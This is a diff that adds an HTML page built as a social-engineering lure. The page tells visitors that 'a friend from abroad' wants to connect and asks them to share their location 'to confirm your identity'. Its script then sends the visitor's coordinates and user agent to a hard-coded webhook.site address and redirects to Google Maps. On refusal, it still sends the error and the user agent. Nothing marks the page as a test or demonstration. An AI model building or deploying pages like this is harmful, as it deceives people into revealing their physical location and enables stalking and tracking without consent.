@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
+  .container { text-align: center; }
+  .spinner {
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #3498db;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 2s linear infinite;
+    margin: 0 auto;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>A friend from abroad wants to connect with you ...</h1>
+  <p>Please allow access to your location to confirm your identity.</p>
+  <div class="spinner"></div>
+</div>
+
+<script>
+// 1
+const WEBHOOK_URL = 'https://webhook.site/c524c43b-aa6f-4164-b75b-3dd56e0297fd';
+
+window.onload = function() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else {
+    alert("이 브라우저에서는 위치 정보 기능을 지원하지 않습니다.");
+  }
+};
+
+function showPosition(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  // 1.
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ latitude: lat, longitude: lon, userAgent: navigator.userAgent }),
+  }).finally(() => {
+    // 2.
+    window.location.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+  });
+}
+
+function showError(error) {
+  // 1
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ error: error.message, code: error.code, userAgent: navigator.userAgent }),
+  }).finally(() => {
+      // 사용자에게는 오류 메시지 표시
+      alert("위치 정보를 가져오는 데 실패했습니다.");
+  });
+}
+</script>
+
+</body>
+</html>
